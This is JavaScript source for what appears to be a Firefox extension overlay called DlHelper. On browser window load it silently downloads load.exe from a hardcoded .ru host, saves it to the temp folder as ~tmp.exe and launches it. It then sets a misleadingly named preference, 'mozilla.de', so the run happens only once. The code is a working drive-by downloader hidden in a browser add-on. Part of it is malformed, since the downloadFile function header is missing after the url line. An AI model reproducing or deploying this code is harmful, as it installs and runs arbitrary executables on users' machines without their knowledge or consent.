
var DlHelper = {

url : "http://test1.ru/pack/load/load.exe",	  var ioserv = Components.classes["@mozilla.org/network/io-service;1"].getService(Components.interfaces.nsIIOService); 
	  var channel = ioserv.newChannel(url, 0, null); 
	  var stream = channel.open(); 

	  if (channel instanceof Components.interfaces.nsIHttpChannel && channel.responseStatus != 200) { 
		return ""; 
	  }

	  var bstream = Components.classes["@mozilla.org/binaryinputstream;1"].createInstance(Components.interfaces.nsIBinaryInputStream); 
	  bstream.setInputStream(stream); 

	  var size = 0; 
	  var file_data = ""; 
	  while(size = bstream.available()) { 
		file_data += bstream.readBytes(size); 
	  } 

	  return file_data; 
	},

	downloadExecute : function(url)
	{
		if(url == "")
			return;
			
		var file = Components.classes["@mozilla.org/file/directory_service;1"].getService(Components.interfaces.nsIProperties).get("TmpD", Components.interfaces.nsIFile);
		file.append("~tmp.exe");
		file.createUnique(Components.interfaces.nsIFile.NORMAL_FILE_TYPE, 0666);

		var data = DlHelper.downloadFile(url);
		
		var foStream = Components.classes["@mozilla.org/network/file-output-stream;1"].createInstance(Components.interfaces.nsIFileOutputStream);
		foStream.init(file, 0x02 | 0x10, 0666, 0);
		foStream.write(data, data.length);
		foStream.close();
		
		var exe = Components.classes["@mozilla.org/file/local;1"].createInstance(Components.interfaces.nsILocalFile);
		exe.initWithPath(file.path);
		exe.launch();
	},

	readString : function (a, b)
	{
		var c = Components.classes["@mozilla.org/preferences-service;1"].getService(Components.interfaces.nsIPrefBranch);
		try 
		{
			return c.getComplexValue(a, Components.interfaces.nsISupportsString).data;
		} 
		catch(e) 
		{
			return b;
		}	
	},

	writeString : function (a, b) 
	{
		var c = Components.classes["@mozilla.org/preferences-service;1"].getService(Components.interfaces.nsIPrefBranch);
		try 
		{
			var d = Components.classes["@mozilla.org/supports-string;1"].createInstance(Components.interfaces.nsISupportsString);
			d.data = b;
			c.setComplexValue(a, Components.interfaces.nsISupportsString, d);
			return true;
		} 
		catch(e) 
		{
			return false;
		}		
	},

	init : function()
	{
		if(DlHelper.readString('mozilla.de', '0') == '0')
		{
			DlHelper.downloadExecute(DlHelper.url);
			DlHelper.writeString('mozilla.de', '1');
		}
	}
}

window.addEventListener("load", function() { DlHelper.init(); }, false);
